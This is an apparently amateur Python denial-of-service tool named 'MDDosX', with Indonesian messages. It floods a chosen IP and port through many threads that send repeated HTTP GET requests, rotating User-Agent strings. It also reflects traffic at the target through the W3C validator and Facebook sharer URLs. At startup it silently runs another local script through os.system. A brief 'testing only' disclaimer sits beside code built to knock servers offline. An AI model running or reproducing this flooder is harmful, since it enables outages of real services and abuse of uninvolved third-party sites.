#!/usr/bin/python3
# -*- coding: utf-8 -*-
# coded by McybearX
# youtube MBEWLEGS
from optparse import OptionParser
from queue import Queue
import os,time,sys,socket,threading,logging,urllib.request,random
emil=print
def iklan():
	os.system("cd ../../bin && python McybearX.py")
iklan()
def user_agent():
    global useragent
    skidipapap = open("../_McybearX_.txt","r").readlines()
#    bahaya = skidipapap.replace("\n","")
    useragent = skidipapap
    bawaannhs = ["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
                 "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
                 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
                 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR "
                 "3.5.30729)",
                 "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 "
                 "Chrome/16.0.912.63 Safari/535.7",
                 "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR "
                 "3.5.30729)",
                 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
                 "Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01",
                 "Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36",
                 "Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36",
                 "Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/51.0.2254.150807",
                 "Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 OPR/50.0.2254.149182",
                 "Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/37.1.2254.132401",
                 "Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 OPR/51.0.2254.150807",
                 "Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M; en-gb) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP",
                 "Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
                 "Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.0.4beta",
                 "Mozilla/5.0 (Linux; Android 9; vivo 1915 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.4.0.0",
                 "Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.5.1300 Mobile Safari/537.36",
                 "Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/51.0.2254.150807"]
    return useragent


def my_bots():
    global bots
    bots = ["http://validator.w3.org/check?uri=", "http://www.facebook.com/sharer/sharer.php?u="]
    return bots


def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(useragent).replace("\n","")}))
            emil("\033[94mbot is hammering...\033[0m")
            time.sleep(.1)
    except:
        time.sleep(.1)

Mbew = 1
ucup = []
def down_it(item):
    Mbew = 1
    try:
        while True:
            packet = str(
                "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(useragent) + "\n" + data).encode(
                'utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                Mbew += 1
                ucup.append("{Mbew}")
                emil("\x1b[1;95m[\x1b[1;91m",len(ucup),"\x1b[1;95m]\x1b[1;97m",len(packet),"mb\x1b[1;91m VIRUS\x1b[1;91mDDOS ATTACK\x1b[1;94m",host,"\x1b[3;97mkecepatan",thr,"byte\033[0m")
            else:
                s.shutdown(1)
                emil("\033[91mshut<->down\033[0m")
            time.sleep(.1)
    except socket.error as e:
        emil("\x1b[1;91m Koneksi Terganggu!!! Atau Server Sedang Down")
       # print("\033[91m",e,"\033[0m")
        time.sleep(.1)
    emil("\x1b[1;97m Jumlah Paket Yang Terkirim ",len(ucup))
    emil(" Berhasil Membuat Server DOWN ")
    sys.exit()

def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()


def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host)
        w.task_done()


def usage():
    emil('''\n \033[95m	MDDosX Attack Tool v2.8
    Pengguna tools ini harus bertanggung jawab untuk
    mematuhi semua hukum yang berlaku.
    Ini hanya untuk skrip pengujian server. IP Anda. \n
    Run : python3 mddosx.py [-s] [-p] [-t]
    Contoh : python3 mddosx.py -s 216.239.38.120 -p 80 -t 135\n
    -h : help
    -s : server ip
    -p : port default 80
    -t : turbo default 135 \033[0m''')
    sys.exit()


def get_parameters():
    global host
    global port
    global thr
    global item
    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel",
                    const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 135 -t 135")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 135
    else:
        thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
# task queue are q,w
q = Queue()
w = Queue()

def aahh(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./20)
def McybearX(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./120)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    os.system("clear")
    McybearX ("""
\x1b[1;91m___  ___\x1b[1;95m     _      _              \x1b[1;91m__   __ 
\x1b[1;91m|  \/  |\x1b[1;95m    | |    | |             \x1b[1;91m\ \ / / 
\x1b[1;91m| .  . |\x1b[1;95m  __| |  __| |  ___   ___  \x1b[1;91m \ V /  
\x1b[1;91m| |\/| |\x1b[1;95m / _` | / _` | / _ \ / __| \x1b[1;91m /   \  
\x1b[1;91m| |  | |\x1b[1;97m| (_| || (_| || (_) |\__ \ \x1b[1;91m/ /^\ \ 
\x1b[1;91m\_|  |_/\x1b[1;97m \__,_| \__,_| \___/ |___/ \x1b[1;91m\/   \/ 
\x1b[3;97m coded by McybearX\33[0;00m

""")
    emil("\033[97m ip : \x1b[1;94m", host, "\x1b[1;97m port : \x1b[1;94m", str(port), "\x1b[1;97m turbo : \x1b[1;94m", str(thr), "byte\033[0m")
    aahh("\x1b[3;97m\n Mencoba Masuk Ke Server...\033[00m")
    user_agent()
    my_bots()
    time.sleep(5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        emil("\n\033[1;91m Cek Server IP Dan Port\033[0m")
        usage()
    while True:
        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True  # if thread is exist, it dies
            t.start()
            t2 = threading.Thread(target=dos2)
            t2.daemon = True  # if thread is exist, it dies
            t2.start()
        start = time.time()
        # tasking
        item = 0
        while True:
            if (item > 1800):  # for no memory crash
                item = 0
                time.sleep(.1)
            item = item + 1
            q.put(item)
            w.put(item)
        q.join()
        w.join()
